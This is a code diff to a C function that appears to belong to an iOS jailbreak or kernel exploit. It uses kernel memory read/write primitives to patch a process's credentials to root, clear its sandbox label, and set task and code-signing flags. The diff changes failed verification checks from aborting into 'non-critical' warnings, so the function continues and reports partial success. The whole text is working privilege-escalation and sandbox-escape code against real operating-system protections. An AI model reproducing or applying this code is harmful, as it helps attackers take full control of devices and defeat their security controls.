@@ -412,6 +412,8 @@ static int prepareIOKitAccess(void) {
 
     kernel_logf("prepareIOKitAccess: proc csflags patched");
 
+    bool hadNonCriticalFailures = false;
+
     struct {
         uint32_t offset;
         uint32_t value;
@@ -426,19 +428,21 @@ static int prepareIOKitAccess(void) {
     for (size_t i = 0; i < sizeof(ucredWrites) / sizeof(ucredWrites[0]); i++) {
         ds_kwrite32(ucred + ucredWrites[i].offset, ucredWrites[i].value);
         if (ds_kread32(ucred + ucredWrites[i].offset) != ucredWrites[i].value) {
-            kernel_logf("prepareIOKitAccess: %s verify failed", ucredWrites[i].name);
-            return -1;
+            kernel_logf("prepareIOKitAccess: %s verify failed (non-critical)", ucredWrites[i].name);
+            hadNonCriticalFailures = true;
         }
     }
 
-    kernel_logf("prepareIOKitAccess: ucred uid/gid fields patched to root");
+    if (!hadNonCriticalFailures) {
+        kernel_logf("prepareIOKitAccess: ucred uid/gid fields patched to root");
+    }
 
     uint64_t crLabel = normalize_kernel_ptr(ds_kread64(ucred + 0x78));
     if (crLabel) {
         ds_kwrite64(ucred + 0x78, 0);
         if (ds_kread64(ucred + 0x78) != 0) {
-            kernel_logf("prepareIOKitAccess: cr_label verify failed");
-            return -1;
+            kernel_logf("prepareIOKitAccess: cr_label verify failed (non-critical)");
+            hadNonCriticalFailures = true;
         }
         kernel_logf("prepareIOKitAccess: sandbox label cleared");
     } else {
@@ -451,8 +455,8 @@ static int prepareIOKitAccess(void) {
         uint32_t newTf = tf | 0x400;
         ds_kwrite32(task + tfOff, newTf);
         if (ds_kread32(task + tfOff) != newTf) {
-            kernel_logf("prepareIOKitAccess: task flags verify failed");
-            return -1;
+            kernel_logf("prepareIOKitAccess: task flags verify failed (non-critical)");
+            hadNonCriticalFailures = true;
         }
 
         uint32_t taskCsOff = tfOff + 4;
@@ -463,8 +467,8 @@ static int prepareIOKitAccess(void) {
             CS_GET_TASK_ALLOW;
         ds_kwrite32(task + taskCsOff, newTaskCs);
         if (ds_kread32(task + taskCsOff) != newTaskCs) {
-            kernel_logf("prepareIOKitAccess: task csflags verify failed");
-            return -1;
+            kernel_logf("prepareIOKitAccess: task csflags verify failed (non-critical)");
+            hadNonCriticalFailures = true;
         }
 
         kernel_logf("prepareIOKitAccess: task flags/csflags patched");
@@ -472,7 +476,11 @@ static int prepareIOKitAccess(void) {
         kernel_logf("prepareIOKitAccess: task flags offset not found; continuing");
     }
 
-    kernel_logf("prepareIOKitAccess: patching finished successfully");
+    if (hadNonCriticalFailures) {
+        kernel_logf("prepareIOKitAccess: patching finished with non-critical failures");
+    } else {
+        kernel_logf("prepareIOKitAccess: patching finished successfully");
+    }
 
     return 0;
 }
